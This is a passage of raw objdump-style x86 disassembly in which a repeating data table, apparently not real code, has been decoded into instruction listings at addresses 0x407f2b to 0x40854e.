  407f2b:	00 01                	add    %al,(%ecx)
	...
  407f35:	11 01                	adc    %eax,(%ecx)
  407f37:	00 00                	add    %al,(%eax)
  407f39:	00 0d 0d 00 00 00    	add    %cl,0xd
  407f3f:	01 00                	add    %eax,(%eax)
  407f41:	00 00                	add    %al,(%eax)
  407f43:	2a 2a                	sub    (%edx),%ch
  407f45:	00 00                	add    %al,(%eax)
  407f47:	00 01                	add    %al,(%ecx)
  407f49:	00 00                	add    %al,(%eax)
  407f4b:	00 0a                	add    %cl,(%edx)
  407f4d:	0a 00                	or     (%eax),%al
  407f4f:	00 00                	add    %al,(%eax)
  407f51:	12 13                	adc    (%ebx),%dl
  407f53:	0e                   	push   %cs
  407f54:	00 00                	add    %al,(%eax)
  407f56:	00 07                	add    %al,(%edi)
  407f58:	07                   	pop    %es
  407f59:	00 00                	add    %al,(%eax)
  407f5b:	00 01                	add    %al,(%ecx)
	...
  407f65:	11 01                	adc    %eax,(%ecx)
  407f67:	00 00                	add    %al,(%eax)
  407f69:	00 0e                	add    %cl,(%esi)
  407f6b:	0e                   	push   %cs
  407f6c:	00 00                	add    %al,(%eax)
  407f6e:	00 01                	add    %al,(%ecx)
  407f70:	00 00                	add    %al,(%eax)
  407f72:	00 9b 9b 00 00 00    	add    %bl,0x9b(%ebx)
  407f78:	01 00                	add    %eax,(%eax)
  407f7a:	00 00                	add    %al,(%eax)
  407f7c:	ec                   	in     (%dx),%al
  407f7d:	ec                   	in     (%dx),%al
  407f7e:	00 00                	add    %al,(%eax)
  407f80:	00 12                	add    %dl,(%edx)
  407f82:	13 0e                	adc    (%esi),%ecx
  407f84:	00 00                	add    %al,(%eax)
  407f86:	00 07                	add    %al,(%edi)
  407f88:	07                   	pop    %es
  407f89:	00 00                	add    %al,(%eax)
  407f8b:	00 01                	add    %al,(%ecx)
	...
  407f95:	11 01                	adc    %eax,(%ecx)
  407f97:	00 00                	add    %al,(%eax)
  407f99:	00 0f                	add    %cl,(%edi)
  407f9b:	0f 00 00             	sldt   (%eax)
  407f9e:	00 1b                	add    %bl,(%ebx)
  407fa0:	00 00                	add    %al,(%eax)
  407fa2:	00 06                	add    %al,(%esi)
  407fa4:	06                   	push   %es
  407fa5:	00 00                	add    %al,(%eax)
  407fa7:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  407faa:	00 00                	add    %al,(%eax)
  407fac:	00 0f                	add    %cl,(%edi)
  407fae:	0f 00 00             	sldt   (%eax)
  407fb1:	00 16                	add    %dl,(%esi)
  407fb3:	17                   	pop    %ss
  407fb4:	18 01                	sbb    %al,(%ecx)
  407fb6:	00 00                	add    %al,(%eax)
  407fb8:	00 15 15 00 00 00    	add    %dl,0x15
  407fbe:	12 13                	adc    (%ebx),%dl
  407fc0:	0e                   	push   %cs
  407fc1:	00 00                	add    %al,(%eax)
  407fc3:	00 07                	add    %al,(%edi)
  407fc5:	07                   	pop    %es
  407fc6:	00 00                	add    %al,(%eax)
  407fc8:	00 01                	add    %al,(%ecx)
	...
  407fd2:	11 01                	adc    %eax,(%ecx)
  407fd4:	00 00                	add    %al,(%eax)
  407fd6:	00 10                	add    %dl,(%eax)
  407fd8:	10 00                	adc    %al,(%eax)
  407fda:	00 00                	add    %al,(%eax)
  407fdc:	1b 00                	sbb    (%eax),%eax
  407fde:	00 00                	add    %al,(%eax)
  407fe0:	06                   	push   %es
  407fe1:	06                   	push   %es
  407fe2:	00 00                	add    %al,(%eax)
  407fe4:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  407fe7:	00 00                	add    %al,(%eax)
  407fe9:	00 10                	add    %dl,(%eax)
  407feb:	10 00                	adc    %al,(%eax)
  407fed:	00 00                	add    %al,(%eax)
  407fef:	16                   	push   %ss
  407ff0:	17                   	pop    %ss
  407ff1:	18 01                	sbb    %al,(%ecx)
  407ff3:	00 00                	add    %al,(%eax)
  407ff5:	00 73 73             	add    %dh,0x73(%ebx)
  407ff8:	00 00                	add    %al,(%eax)
  407ffa:	00 12                	add    %dl,(%edx)
  407ffc:	13 0e                	adc    (%esi),%ecx
  407ffe:	00 00                	add    %al,(%eax)
  408000:	00 07                	add    %al,(%edi)
  408002:	07                   	pop    %es
  408003:	00 00                	add    %al,(%eax)
  408005:	00 01                	add    %al,(%ecx)
	...
  40800f:	11 01                	adc    %eax,(%ecx)
  408011:	00 00                	add    %al,(%eax)
  408013:	00 11                	add    %dl,(%ecx)
  408015:	11 00                	adc    %eax,(%eax)
  408017:	00 00                	add    %al,(%eax)
  408019:	01 00                	add    %eax,(%eax)
  40801b:	00 00                	add    %al,(%eax)
  40801d:	5a                   	pop    %edx
  40801e:	5a                   	pop    %edx
  40801f:	00 00                	add    %al,(%eax)
  408021:	00 01                	add    %al,(%ecx)
  408023:	00 00                	add    %al,(%eax)
  408025:	00 7a 7a             	add    %bh,0x7a(%edx)
  408028:	00 00                	add    %al,(%eax)
  40802a:	00 12                	add    %dl,(%edx)
  40802c:	13 0e                	adc    (%esi),%ecx
  40802e:	00 00                	add    %al,(%eax)
  408030:	00 07                	add    %al,(%edi)
  408032:	07                   	pop    %es
  408033:	00 00                	add    %al,(%eax)
  408035:	00 01                	add    %al,(%ecx)
	...
  40803f:	11 01                	adc    %eax,(%ecx)
  408041:	00 00                	add    %al,(%eax)
  408043:	00 12                	add    %dl,(%edx)
  408045:	12 00                	adc    (%eax),%al
  408047:	00 00                	add    %al,(%eax)
  408049:	01 00                	add    %eax,(%eax)
  40804b:	00 00                	add    %al,(%eax)
  40804d:	f4                   	hlt
  40804e:	f4                   	hlt
  40804f:	00 00                	add    %al,(%eax)
  408051:	00 01                	add    %al,(%ecx)
  408053:	00 00                	add    %al,(%eax)
  408055:	00 84 84 00 00 00 12 	add    %al,0x12000000(%esp,%eax,4)
  40805c:	13 0e                	adc    (%esi),%ecx
  40805e:	00 00                	add    %al,(%eax)
  408060:	00 07                	add    %al,(%edi)
  408062:	07                   	pop    %es
  408063:	00 00                	add    %al,(%eax)
  408065:	00 01                	add    %al,(%ecx)
	...
  40806f:	11 01                	adc    %eax,(%ecx)
  408071:	00 00                	add    %al,(%eax)
  408073:	00 13                	add    %dl,(%ebx)
  408075:	13 00                	adc    (%eax),%eax
  408077:	00 00                	add    %al,(%eax)
  408079:	01 00                	add    %eax,(%eax)
  40807b:	00 00                	add    %al,(%eax)
  40807d:	c2 c2 00             	ret    $0xc2
  408080:	00 00                	add    %al,(%eax)
  408082:	01 00                	add    %eax,(%eax)
  408084:	00 00                	add    %al,(%eax)
  408086:	b0 b0                	mov    $0xb0,%al
  408088:	00 00                	add    %al,(%eax)
  40808a:	00 12                	add    %dl,(%edx)
  40808c:	13 0e                	adc    (%esi),%ecx
  40808e:	00 00                	add    %al,(%eax)
  408090:	00 07                	add    %al,(%edi)
  408092:	07                   	pop    %es
  408093:	00 00                	add    %al,(%eax)
  408095:	00 01                	add    %al,(%ecx)
	...
  40809f:	11 01                	adc    %eax,(%ecx)
  4080a1:	00 00                	add    %al,(%eax)
  4080a3:	00 14 14             	add    %dl,(%esp,%edx,1)
  4080a6:	00 00                	add    %al,(%eax)
  4080a8:	00 01                	add    %al,(%ecx)
  4080aa:	00 00                	add    %al,(%eax)
  4080ac:	00 86 86 00 00 00    	add    %al,0x86(%esi)
  4080b2:	01 00                	add    %eax,(%eax)
  4080b4:	00 00                	add    %al,(%eax)
  4080b6:	e9 e9 00 00 00       	jmp    0x4081a4
  4080bb:	12 13                	adc    (%ebx),%dl
  4080bd:	0e                   	push   %cs
  4080be:	00 00                	add    %al,(%eax)
  4080c0:	00 07                	add    %al,(%edi)
  4080c2:	07                   	pop    %es
  4080c3:	00 00                	add    %al,(%eax)
  4080c5:	00 01                	add    %al,(%ecx)
	...
  4080cf:	11 01                	adc    %eax,(%ecx)
  4080d1:	00 00                	add    %al,(%eax)
  4080d3:	00 15 15 00 00 00    	add    %dl,0x15
  4080d9:	1b 00                	sbb    (%eax),%eax
  4080db:	00 00                	add    %al,(%eax)
  4080dd:	06                   	push   %es
  4080de:	06                   	push   %es
  4080df:	00 00                	add    %al,(%eax)
  4080e1:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  4080e4:	00 00                	add    %al,(%eax)
  4080e6:	00 15 15 00 00 00    	add    %dl,0x15
  4080ec:	16                   	push   %ss
  4080ed:	17                   	pop    %ss
  4080ee:	18 01                	sbb    %al,(%ecx)
  4080f0:	00 00                	add    %al,(%eax)
  4080f2:	00 81 81 00 00 00    	add    %al,0x81(%ecx)
  4080f8:	12 13                	adc    (%ebx),%dl
  4080fa:	0e                   	push   %cs
  4080fb:	00 00                	add    %al,(%eax)
  4080fd:	00 07                	add    %al,(%edi)
  4080ff:	07                   	pop    %es
  408100:	00 00                	add    %al,(%eax)
  408102:	00 01                	add    %al,(%ecx)
	...
  40810c:	11 01                	adc    %eax,(%ecx)
  40810e:	00 00                	add    %al,(%eax)
  408110:	00 16                	add    %dl,(%esi)
  408112:	16                   	push   %ss
  408113:	00 00                	add    %al,(%eax)
  408115:	00 1b                	add    %bl,(%ebx)
  408117:	00 00                	add    %al,(%eax)
  408119:	00 06                	add    %al,(%esi)
  40811b:	06                   	push   %es
  40811c:	00 00                	add    %al,(%eax)
  40811e:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  408121:	00 00                	add    %al,(%eax)
  408123:	00 16                	add    %dl,(%esi)
  408125:	16                   	push   %ss
  408126:	00 00                	add    %al,(%eax)
  408128:	00 16                	add    %dl,(%esi)
  40812a:	17                   	pop    %ss
  40812b:	18 01                	sbb    %al,(%ecx)
  40812d:	00 00                	add    %al,(%eax)
  40812f:	00 ec                	add    %ch,%ah
  408131:	ec                   	in     (%dx),%al
  408132:	00 00                	add    %al,(%eax)
  408134:	00 12                	add    %dl,(%edx)
  408136:	13 0e                	adc    (%esi),%ecx
  408138:	00 00                	add    %al,(%eax)
  40813a:	00 07                	add    %al,(%edi)
  40813c:	07                   	pop    %es
  40813d:	00 00                	add    %al,(%eax)
  40813f:	00 01                	add    %al,(%ecx)
	...
  408149:	11 01                	adc    %eax,(%ecx)
  40814b:	00 00                	add    %al,(%eax)
  40814d:	00 17                	add    %dl,(%edi)
  40814f:	17                   	pop    %ss
  408150:	00 00                	add    %al,(%eax)
  408152:	00 1b                	add    %bl,(%ebx)
  408154:	00 00                	add    %al,(%eax)
  408156:	00 06                	add    %al,(%esi)
  408158:	06                   	push   %es
  408159:	00 00                	add    %al,(%eax)
  40815b:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  40815e:	00 00                	add    %al,(%eax)
  408160:	00 17                	add    %dl,(%edi)
  408162:	17                   	pop    %ss
  408163:	00 00                	add    %al,(%eax)
  408165:	00 16                	add    %dl,(%esi)
  408167:	17                   	pop    %ss
  408168:	18 01                	sbb    %al,(%ecx)
  40816a:	00 00                	add    %al,(%eax)
  40816c:	00 03                	add    %al,(%ebx)
  40816e:	03 00                	add    (%eax),%eax
  408170:	00 00                	add    %al,(%eax)
  408172:	12 13                	adc    (%ebx),%dl
  408174:	0e                   	push   %cs
  408175:	00 00                	add    %al,(%eax)
  408177:	00 07                	add    %al,(%edi)
  408179:	07                   	pop    %es
  40817a:	00 00                	add    %al,(%eax)
  40817c:	00 01                	add    %al,(%ecx)
	...
  408186:	11 01                	adc    %eax,(%ecx)
  408188:	00 00                	add    %al,(%eax)
  40818a:	00 18                	add    %bl,(%eax)
  40818c:	18 00                	sbb    %al,(%eax)
  40818e:	00 00                	add    %al,(%eax)
  408190:	01 00                	add    %eax,(%eax)
  408192:	00 00                	add    %al,(%eax)
  408194:	99                   	cltd
  408195:	99                   	cltd
  408196:	00 00                	add    %al,(%eax)
  408198:	00 01                	add    %al,(%ecx)
  40819a:	00 00                	add    %al,(%eax)
  40819c:	00 ed                	add    %ch,%ch
  40819e:	ed                   	in     (%dx),%eax
  40819f:	00 00                	add    %al,(%eax)
  4081a1:	00 12                	add    %dl,(%edx)
  4081a3:	13 0e                	adc    (%esi),%ecx
  4081a5:	00 00                	add    %al,(%eax)
  4081a7:	00 07                	add    %al,(%edi)
  4081a9:	07                   	pop    %es
  4081aa:	00 00                	add    %al,(%eax)
  4081ac:	00 01                	add    %al,(%ecx)
	...
  4081b6:	11 01                	adc    %eax,(%ecx)
  4081b8:	00 00                	add    %al,(%eax)
  4081ba:	00 19                	add    %bl,(%ecx)
  4081bc:	19 00                	sbb    %eax,(%eax)
  4081be:	00 00                	add    %al,(%eax)
  4081c0:	01 00                	add    %eax,(%eax)
  4081c2:	00 00                	add    %al,(%eax)
  4081c4:	9b                   	fwait
  4081c5:	9b                   	fwait
  4081c6:	00 00                	add    %al,(%eax)
  4081c8:	00 01                	add    %al,(%ecx)
  4081ca:	00 00                	add    %al,(%eax)
  4081cc:	00 fe                	add    %bh,%dh
  4081ce:	fe 00                	incb   (%eax)
  4081d0:	00 00                	add    %al,(%eax)
  4081d2:	12 13                	adc    (%ebx),%dl
  4081d4:	0e                   	push   %cs
  4081d5:	00 00                	add    %al,(%eax)
  4081d7:	00 07                	add    %al,(%edi)
  4081d9:	07                   	pop    %es
  4081da:	00 00                	add    %al,(%eax)
  4081dc:	00 01                	add    %al,(%ecx)
	...
  4081e6:	11 01                	adc    %eax,(%ecx)
  4081e8:	00 00                	add    %al,(%eax)
  4081ea:	00 1a                	add    %bl,(%edx)
  4081ec:	1a 00                	sbb    (%eax),%al
  4081ee:	00 00                	add    %al,(%eax)
  4081f0:	01 00                	add    %eax,(%eax)
  4081f2:	00 00                	add    %al,(%eax)
  4081f4:	c7 c7 00 00 00 01    	mov    $0x1000000,%edi
  4081fa:	00 00                	add    %al,(%eax)
  4081fc:	00 a3 a3 00 00 00    	add    %ah,0xa3(%ebx)
  408202:	12 13                	adc    (%ebx),%dl
  408204:	0e                   	push   %cs
  408205:	00 00                	add    %al,(%eax)
  408207:	00 07                	add    %al,(%edi)
  408209:	07                   	pop    %es
  40820a:	00 00                	add    %al,(%eax)
  40820c:	00 01                	add    %al,(%ecx)
	...
  408216:	11 01                	adc    %eax,(%ecx)
  408218:	00 00                	add    %al,(%eax)
  40821a:	00 1b                	add    %bl,(%ebx)
  40821c:	1b 00                	sbb    (%eax),%eax
  40821e:	00 00                	add    %al,(%eax)
  408220:	01 00                	add    %eax,(%eax)
  408222:	00 00                	add    %al,(%eax)
  408224:	20 20                	and    %ah,(%eax)
  408226:	00 00                	add    %al,(%eax)
  408228:	00 01                	add    %al,(%ecx)
	...
  408232:	12 13                	adc    (%ebx),%dl
  408234:	0e                   	push   %cs
  408235:	00 00                	add    %al,(%eax)
  408237:	00 07                	add    %al,(%edi)
  408239:	07                   	pop    %es
  40823a:	00 00                	add    %al,(%eax)
  40823c:	00 01                	add    %al,(%ecx)
	...
  408246:	11 01                	adc    %eax,(%ecx)
  408248:	00 00                	add    %al,(%eax)
  40824a:	00 1c 1c             	add    %bl,(%esp,%ebx,1)
  40824d:	00 00                	add    %al,(%eax)
  40824f:	00 1b                	add    %bl,(%ebx)
  408251:	00 00                	add    %al,(%eax)
  408253:	00 06                	add    %al,(%esi)
  408255:	06                   	push   %es
  408256:	00 00                	add    %al,(%eax)
  408258:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  40825b:	00 00                	add    %al,(%eax)
  40825d:	00 1c 1c             	add    %bl,(%esp,%ebx,1)
  408260:	00 00                	add    %al,(%eax)
  408262:	00 16                	add    %dl,(%esi)
  408264:	17                   	pop    %ss
  408265:	18 01                	sbb    %al,(%ecx)
  408267:	00 00                	add    %al,(%eax)
  408269:	00 54 54 00          	add    %dl,0x0(%esp,%edx,2)
  40826d:	00 00                	add    %al,(%eax)
  40826f:	12 13                	adc    (%ebx),%dl
  408271:	0e                   	push   %cs
  408272:	00 00                	add    %al,(%eax)
  408274:	00 07                	add    %al,(%edi)
  408276:	07                   	pop    %es
  408277:	00 00                	add    %al,(%eax)
  408279:	00 01                	add    %al,(%ecx)
	...
  408283:	11 01                	adc    %eax,(%ecx)
  408285:	00 00                	add    %al,(%eax)
  408287:	00 1d 1d 00 00 00    	add    %bl,0x1d
  40828d:	1b 00                	sbb    (%eax),%eax
  40828f:	00 00                	add    %al,(%eax)
  408291:	06                   	push   %es
  408292:	06                   	push   %es
  408293:	00 00                	add    %al,(%eax)
  408295:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  408298:	00 00                	add    %al,(%eax)
  40829a:	00 1d 1d 00 00 00    	add    %bl,0x1d
  4082a0:	16                   	push   %ss
  4082a1:	17                   	pop    %ss
  4082a2:	18 01                	sbb    %al,(%ecx)
  4082a4:	00 00                	add    %al,(%eax)
  4082a6:	00 32                	add    %dh,(%edx)
  4082a8:	32 00                	xor    (%eax),%al
  4082aa:	00 00                	add    %al,(%eax)
  4082ac:	12 13                	adc    (%ebx),%dl
  4082ae:	0e                   	push   %cs
  4082af:	00 00                	add    %al,(%eax)
  4082b1:	00 07                	add    %al,(%edi)
  4082b3:	07                   	pop    %es
  4082b4:	00 00                	add    %al,(%eax)
  4082b6:	00 01                	add    %al,(%ecx)
	...
  4082c0:	11 01                	adc    %eax,(%ecx)
  4082c2:	00 00                	add    %al,(%eax)
  4082c4:	00 1e                	add    %bl,(%esi)
  4082c6:	1e                   	push   %ds
  4082c7:	00 00                	add    %al,(%eax)
  4082c9:	00 1b                	add    %bl,(%ebx)
  4082cb:	00 00                	add    %al,(%eax)
  4082cd:	00 06                	add    %al,(%esi)
  4082cf:	06                   	push   %es
  4082d0:	00 00                	add    %al,(%eax)
  4082d2:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  4082d5:	00 00                	add    %al,(%eax)
  4082d7:	00 1e                	add    %bl,(%esi)
  4082d9:	1e                   	push   %ds
  4082da:	00 00                	add    %al,(%eax)
  4082dc:	00 16                	add    %dl,(%esi)
  4082de:	17                   	pop    %ss
  4082df:	18 01                	sbb    %al,(%ecx)
  4082e1:	00 00                	add    %al,(%eax)
  4082e3:	00 7c 7c 00          	add    %bh,0x0(%esp,%edi,2)
  4082e7:	00 00                	add    %al,(%eax)
  4082e9:	12 13                	adc    (%ebx),%dl
  4082eb:	0e                   	push   %cs
  4082ec:	00 00                	add    %al,(%eax)
  4082ee:	00 07                	add    %al,(%edi)
  4082f0:	07                   	pop    %es
  4082f1:	00 00                	add    %al,(%eax)
  4082f3:	00 01                	add    %al,(%ecx)
	...
  4082fd:	11 01                	adc    %eax,(%ecx)
  4082ff:	00 00                	add    %al,(%eax)
  408301:	00 1f                	add    %bl,(%edi)
  408303:	1f                   	pop    %ds
  408304:	00 00                	add    %al,(%eax)
  408306:	00 1b                	add    %bl,(%ebx)
  408308:	00 00                	add    %al,(%eax)
  40830a:	00 06                	add    %al,(%esi)
  40830c:	06                   	push   %es
  40830d:	00 00                	add    %al,(%eax)
  40830f:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  408312:	00 00                	add    %al,(%eax)
  408314:	00 1f                	add    %bl,(%edi)
  408316:	1f                   	pop    %ds
  408317:	00 00                	add    %al,(%eax)
  408319:	00 16                	add    %dl,(%esi)
  40831b:	17                   	pop    %ss
  40831c:	18 01                	sbb    %al,(%ecx)
  40831e:	00 00                	add    %al,(%eax)
  408320:	00 dd                	add    %bl,%ch
  408322:	dd 00                	fldl   (%eax)
  408324:	00 00                	add    %al,(%eax)
  408326:	12 13                	adc    (%ebx),%dl
  408328:	0e                   	push   %cs
  408329:	00 00                	add    %al,(%eax)
  40832b:	00 07                	add    %al,(%edi)
  40832d:	07                   	pop    %es
  40832e:	00 00                	add    %al,(%eax)
  408330:	00 01                	add    %al,(%ecx)
	...
  40833a:	11 01                	adc    %eax,(%ecx)
  40833c:	00 00                	add    %al,(%eax)
  40833e:	00 20                	add    %ah,(%eax)
  408340:	20 00                	and    %al,(%eax)
  408342:	00 00                	add    %al,(%eax)
  408344:	01 00                	add    %eax,(%eax)
  408346:	00 00                	add    %al,(%eax)
  408348:	8f                   	(bad)
  408349:	8f 00                	pop    (%eax)
  40834b:	00 00                	add    %al,(%eax)
  40834d:	01 00                	add    %eax,(%eax)
  40834f:	00 00                	add    %al,(%eax)
  408351:	ea ea 00 00 00 12 13 	ljmp   $0x1312,$0xea
  408358:	0e                   	push   %cs
  408359:	00 00                	add    %al,(%eax)
  40835b:	00 07                	add    %al,(%edi)
  40835d:	07                   	pop    %es
  40835e:	00 00                	add    %al,(%eax)
  408360:	00 01                	add    %al,(%ecx)
	...
  40836a:	11 01                	adc    %eax,(%ecx)
  40836c:	00 00                	add    %al,(%eax)
  40836e:	00 21                	add    %ah,(%ecx)
  408370:	21 00                	and    %eax,(%eax)
  408372:	00 00                	add    %al,(%eax)
  408374:	01 00                	add    %eax,(%eax)
  408376:	00 00                	add    %al,(%eax)
  408378:	02 02                	add    (%edx),%al
  40837a:	00 00                	add    %al,(%eax)
  40837c:	00 01                	add    %al,(%ecx)
  40837e:	00 00                	add    %al,(%eax)
  408380:	00 6f 6f             	add    %ch,0x6f(%edi)
  408383:	00 00                	add    %al,(%eax)
  408385:	00 12                	add    %dl,(%edx)
  408387:	13 0e                	adc    (%esi),%ecx
  408389:	00 00                	add    %al,(%eax)
  40838b:	00 07                	add    %al,(%edi)
  40838d:	07                   	pop    %es
  40838e:	00 00                	add    %al,(%eax)
  408390:	00 01                	add    %al,(%ecx)
	...
  40839a:	11 01                	adc    %eax,(%ecx)
  40839c:	00 00                	add    %al,(%eax)
  40839e:	00 22                	add    %ah,(%edx)
  4083a0:	22 00                	and    (%eax),%al
  4083a2:	00 00                	add    %al,(%eax)
  4083a4:	1b 00                	sbb    (%eax),%eax
  4083a6:	00 00                	add    %al,(%eax)
  4083a8:	06                   	push   %es
  4083a9:	06                   	push   %es
  4083aa:	00 00                	add    %al,(%eax)
  4083ac:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  4083af:	00 00                	add    %al,(%eax)
  4083b1:	00 22                	add    %ah,(%edx)
  4083b3:	22 00                	and    (%eax),%al
  4083b5:	00 00                	add    %al,(%eax)
  4083b7:	16                   	push   %ss
  4083b8:	17                   	pop    %ss
  4083b9:	18 01                	sbb    %al,(%ecx)
  4083bb:	00 00                	add    %al,(%eax)
  4083bd:	00 d8                	add    %bl,%al
  4083bf:	d8 00                	fadds  (%eax)
  4083c1:	00 00                	add    %al,(%eax)
  4083c3:	12 13                	adc    (%ebx),%dl
  4083c5:	0e                   	push   %cs
  4083c6:	00 00                	add    %al,(%eax)
  4083c8:	00 07                	add    %al,(%edi)
  4083ca:	07                   	pop    %es
  4083cb:	00 00                	add    %al,(%eax)
  4083cd:	00 01                	add    %al,(%ecx)
	...
  4083d7:	11 01                	adc    %eax,(%ecx)
  4083d9:	00 00                	add    %al,(%eax)
  4083db:	00 23                	add    %ah,(%ebx)
  4083dd:	23 00                	and    (%eax),%eax
  4083df:	00 00                	add    %al,(%eax)
  4083e1:	01 00                	add    %eax,(%eax)
  4083e3:	00 00                	add    %al,(%eax)
  4083e5:	5d                   	pop    %ebp
  4083e6:	5d                   	pop    %ebp
  4083e7:	00 00                	add    %al,(%eax)
  4083e9:	00 01                	add    %al,(%ecx)
  4083eb:	00 00                	add    %al,(%eax)
  4083ed:	00 7d 7d             	add    %bh,0x7d(%ebp)
  4083f0:	00 00                	add    %al,(%eax)
  4083f2:	00 12                	add    %dl,(%edx)
  4083f4:	13 0e                	adc    (%esi),%ecx
  4083f6:	00 00                	add    %al,(%eax)
  4083f8:	00 07                	add    %al,(%edi)
  4083fa:	07                   	pop    %es
  4083fb:	00 00                	add    %al,(%eax)
  4083fd:	00 01                	add    %al,(%ecx)
	...
  408407:	11 01                	adc    %eax,(%ecx)
  408409:	00 00                	add    %al,(%eax)
  40840b:	00 24 24             	add    %ah,(%esp)
  40840e:	00 00                	add    %al,(%eax)
  408410:	00 1b                	add    %bl,(%ebx)
  408412:	00 00                	add    %al,(%eax)
  408414:	00 06                	add    %al,(%esi)
  408416:	06                   	push   %es
  408417:	00 00                	add    %al,(%eax)
  408419:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  40841c:	00 00                	add    %al,(%eax)
  40841e:	00 24 24             	add    %ah,(%esp)
  408421:	00 00                	add    %al,(%eax)
  408423:	00 16                	add    %dl,(%esi)
  408425:	17                   	pop    %ss
  408426:	18 01                	sbb    %al,(%ecx)
  408428:	00 00                	add    %al,(%eax)
  40842a:	00 eb                	add    %ch,%bl
  40842c:	eb 00                	jmp    0x40842e
  40842e:	00 00                	add    %al,(%eax)
  408430:	12 13                	adc    (%ebx),%dl
  408432:	0e                   	push   %cs
  408433:	00 00                	add    %al,(%eax)
  408435:	00 07                	add    %al,(%edi)
  408437:	07                   	pop    %es
  408438:	00 00                	add    %al,(%eax)
  40843a:	00 01                	add    %al,(%ecx)
	...
  408444:	11 01                	adc    %eax,(%ecx)
  408446:	00 00                	add    %al,(%eax)
  408448:	00 25 25 00 00 00    	add    %ah,0x25
  40844e:	1b 00                	sbb    (%eax),%eax
  408450:	00 00                	add    %al,(%eax)
  408452:	06                   	push   %es
  408453:	06                   	push   %es
  408454:	00 00                	add    %al,(%eax)
  408456:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  408459:	00 00                	add    %al,(%eax)
  40845b:	00 25 25 00 00 00    	add    %ah,0x25
  408461:	16                   	push   %ss
  408462:	17                   	pop    %ss
  408463:	18 01                	sbb    %al,(%ecx)
  408465:	00 00                	add    %al,(%eax)
  408467:	00 99 99 00 00 00    	add    %bl,0x99(%ecx)
  40846d:	12 13                	adc    (%ebx),%dl
  40846f:	0e                   	push   %cs
  408470:	00 00                	add    %al,(%eax)
  408472:	00 07                	add    %al,(%edi)
  408474:	07                   	pop    %es
  408475:	00 00                	add    %al,(%eax)
  408477:	00 01                	add    %al,(%ecx)
	...
  408481:	11 01                	adc    %eax,(%ecx)
  408483:	00 00                	add    %al,(%eax)
  408485:	00 26                	add    %ah,(%esi)
  408487:	26 00 00             	add    %al,%es:(%eax)
  40848a:	00 01                	add    %al,(%ecx)
  40848c:	00 00                	add    %al,(%eax)
  40848e:	00 30                	add    %dh,(%eax)
  408490:	30 00                	xor    %al,(%eax)
  408492:	00 00                	add    %al,(%eax)
  408494:	01 00                	add    %eax,(%eax)
  408496:	00 00                	add    %al,(%eax)
  408498:	42                   	inc    %edx
  408499:	42                   	inc    %edx
  40849a:	00 00                	add    %al,(%eax)
  40849c:	00 12                	add    %dl,(%edx)
  40849e:	13 0e                	adc    (%esi),%ecx
  4084a0:	00 00                	add    %al,(%eax)
  4084a2:	00 07                	add    %al,(%edi)
  4084a4:	07                   	pop    %es
  4084a5:	00 00                	add    %al,(%eax)
  4084a7:	00 01                	add    %al,(%ecx)
	...
  4084b1:	11 01                	adc    %eax,(%ecx)
  4084b3:	00 00                	add    %al,(%eax)
  4084b5:	00 27                	add    %ah,(%edi)
  4084b7:	27                   	daa
  4084b8:	00 00                	add    %al,(%eax)
  4084ba:	00 01                	add    %al,(%ecx)
  4084bc:	00 00                	add    %al,(%eax)
  4084be:	00 2c 2c             	add    %ch,(%esp,%ebp,1)
  4084c1:	00 00                	add    %al,(%eax)
  4084c3:	00 01                	add    %al,(%ecx)
  4084c5:	00 00                	add    %al,(%eax)
  4084c7:	00 5f 5f             	add    %bl,0x5f(%edi)
  4084ca:	00 00                	add    %al,(%eax)
  4084cc:	00 12                	add    %dl,(%edx)
  4084ce:	13 0e                	adc    (%esi),%ecx
  4084d0:	00 00                	add    %al,(%eax)
  4084d2:	00 07                	add    %al,(%edi)
  4084d4:	07                   	pop    %es
  4084d5:	00 00                	add    %al,(%eax)
  4084d7:	00 01                	add    %al,(%ecx)
	...
  4084e1:	11 01                	adc    %eax,(%ecx)
  4084e3:	00 00                	add    %al,(%eax)
  4084e5:	00 28                	add    %ch,(%eax)
  4084e7:	28 00                	sub    %al,(%eax)
  4084e9:	00 00                	add    %al,(%eax)
  4084eb:	1b 00                	sbb    (%eax),%eax
  4084ed:	00 00                	add    %al,(%eax)
  4084ef:	06                   	push   %es
  4084f0:	06                   	push   %es
  4084f1:	00 00                	add    %al,(%eax)
  4084f3:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  4084f6:	00 00                	add    %al,(%eax)
  4084f8:	00 28                	add    %ch,(%eax)
  4084fa:	28 00                	sub    %al,(%eax)
  4084fc:	00 00                	add    %al,(%eax)
  4084fe:	16                   	push   %ss
  4084ff:	17                   	pop    %ss
  408500:	18 01                	sbb    %al,(%ecx)
  408502:	00 00                	add    %al,(%eax)
  408504:	00 1a                	add    %bl,(%edx)
  408506:	1a 00                	sbb    (%eax),%al
  408508:	00 00                	add    %al,(%eax)
  40850a:	12 13                	adc    (%ebx),%dl
  40850c:	0e                   	push   %cs
  40850d:	00 00                	add    %al,(%eax)
  40850f:	00 07                	add    %al,(%edi)
  408511:	07                   	pop    %es
  408512:	00 00                	add    %al,(%eax)
  408514:	00 01                	add    %al,(%ecx)
	...
  40851e:	11 01                	adc    %eax,(%ecx)
  408520:	00 00                	add    %al,(%eax)
  408522:	00 29                	add    %ch,(%ecx)
  408524:	29 00                	sub    %eax,(%eax)
  408526:	00 00                	add    %al,(%eax)
  408528:	01 00                	add    %eax,(%eax)
  40852a:	00 00                	add    %al,(%eax)
  40852c:	a2 a2 00 00 00       	mov    %al,0xa2
  408531:	01 00                	add    %eax,(%eax)
  408533:	00 00                	add    %al,(%eax)
  408535:	cd cd                	int    $0xcd
  408537:	00 00                	add    %al,(%eax)
  408539:	00 12                	add    %dl,(%edx)
  40853b:	13 0e                	adc    (%esi),%ecx
  40853d:	00 00                	add    %al,(%eax)
  40853f:	00 07                	add    %al,(%edi)
  408541:	07                   	pop    %es
  408542:	00 00                	add    %al,(%eax)
  408544:	00 01                	add    %al,(%ecx)
	...
  40854e:	11 01                	adc    %eax,(%ecx)
